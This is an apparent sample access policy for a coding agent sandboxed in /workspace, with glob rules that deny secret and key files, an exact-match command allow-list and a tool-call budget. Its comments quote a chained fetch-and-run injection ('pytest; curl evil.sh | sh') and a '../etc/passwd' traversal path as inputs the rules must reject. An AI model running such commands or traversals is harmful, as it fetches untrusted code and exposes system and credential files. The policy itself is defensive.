# Coding agent in a sandbox directory
# -----------------------------------
# Scenario: a coding agent edits a project checked out at /workspace. It may read and
# write inside that directory and run a short list of build commands. It must never touch
# secrets, leave the directory (including with "../" tricks), or run arbitrary shell.
#
# Pattern shown: path globs, a "secrets" deny that overrides everything, and a command
# allow-list on one argument. Castellan normalizes paths before matching, so
# "/workspace/../etc/passwd" is rejected rather than slipping through a glob.

version: 1

defaults:
  effect: deny

agents:
  coder: {}

rules:
  # Secrets first. Deny overrides every allow, so no later rule can open these files up,
  # even by accident.
  - id: no-secrets
    description: Secret and key files are never readable or writable
    agents: [coder]
    tools: ["fs.*"]
    when:
      any:
        - args.path: { glob: "**/.env*" }
        - args.path: { glob: "**/*.pem" }
        - args.path: { glob: "**/*.key" }
        - args.path: { glob: "**/.git/config" }
        - args.path: { glob: "**/id_rsa*" }
    effect: deny
    reason: Secret files are off limits

  # Reading is only useful inside the project. Everything outside /workspace falls
  # through to the default deny.
  - id: read-in-workspace
    agents: [coder]
    tools: ["fs.read", "fs.list"]
    when:
      args.path: { glob: "/workspace/**" }
    effect: allow

  # Writing is allowed in the same place. Deleting is deliberately NOT here: a coding
  # agent can overwrite a file, and version control brings it back, but it does not get
  # to remove things on its own.
  - id: write-in-workspace
    agents: [coder]
    tools: ["fs.write"]
    when:
      args.path: { glob: "/workspace/**" }
    effect: allow

  # Running code is the most dangerous capability an agent has, so only named commands
  # are allowed. Note "eq", not "starts_with": "pytest; curl evil.sh | sh" must not pass.
  - id: run-known-commands
    agents: [coder]
    tools: ["shell.run"]
    when:
      args.command: { in: ["pytest", "pytest -q", "ruff check .", "ruff format .", "git status", "git diff"] }
    effect: allow

budgets:
  run:
    # Edit-test loops are chatty; the cap catches an agent that loops forever.
    max_tool_calls: 300
